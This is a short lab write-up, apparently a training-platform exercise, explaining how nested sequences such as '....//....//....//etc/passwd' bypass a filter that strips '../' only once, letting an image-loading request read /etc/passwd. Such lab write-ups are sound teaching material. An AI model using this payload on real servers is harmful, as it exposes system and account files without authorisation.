## Lab: File path traversal, traversal sequences stripped non-recursively

Like in the previous lab, intercept the image-loading request using Burp Suite.

<img width="404" height="405" alt="image" src="https://github.com/user-attachments/assets/ccba1502-8656-4354-8cdf-4af639316e86" />

The original request is:

```http
GET /image?filename=9.jpg HTTP/2
```

Modify the `filename` parameter using nested traversal sequences:

```http
GET /image?filename=9.jpg HTTP/2
>
GET /image?filename=....//....//....//etc/passwd HTTP/2
```

<img width="409" height="460" alt="image" src="https://github.com/user-attachments/assets/10180d2d-9be6-422a-93d7-e066080e1b35" />

The server successfully returns the contents of `/etc/passwd`.

This confirms that the application strips traversal sequences such as `../`, but does not process them recursively.

In this case, the traversal protection can therefore be bypassed by supplying:

```text
....//....//....//etc/passwd
```

After the application removes the inner `../` sequences, the remaining input becomes:

```text
../../../etc/passwd
```

Successfully retrieved the contents of `/etc/passwd`.

This confirms that non-recursive traversal sequence filtering can be bypassed using nested traversal sequences.
